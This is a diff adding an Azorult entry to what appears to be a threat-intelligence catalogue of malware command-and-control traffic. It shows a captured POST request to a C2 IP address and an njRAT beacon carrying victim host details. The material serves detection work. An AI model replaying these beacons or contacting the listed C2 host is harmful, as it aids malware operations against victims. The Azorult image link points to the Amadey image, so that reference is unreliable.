@@ -57,6 +57,19 @@ Connection: close
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/amadey.png "Amadey")
 
+#### Azorult
+POST retrieve metod, unique pattern with lot's of '/' and ')'
+~~~
+POST /index.php HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)
+Host: 51.38.76.57
+Content-Length: 103
+Cache-Control: no-cache
+
+J/.8/.:/.</.?/.>O.(8.I/.>/.9/.>K.>8.N/.I/.;/.</.;N.>:.NL.?N.>8.(9.L/.8/.</.4/.4/.I/.?/.>H.(9.(9.(9.(9.I
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/amadey.png "Azorult")
+
 #### Bladabindi - nJrat
 ~~~
 147.ll1990MURFTUFZT19DNEJBMzY0Nw==1990USER-PC1990admin199018-03-2619901990Win 7 Professional SP1 x861990No1990N/A1990..1990UHJvZ3JhbSBNYW5hZ2VyAA==1990123.inf1990MURFTUFZTw0KMWRlbWF5by5kdWNrZG5zLm9yZzoxOTkwDQp2NC4wLjMwMzE5DQpSZWdTdmNzLmV4ZQ0KRmFsc2UNCkZhbHNlDQpGYWxzZQ0KRmFsc2U=15.CAP199035199023926.CAP1990......JFIF.....`.`.....C...........		.
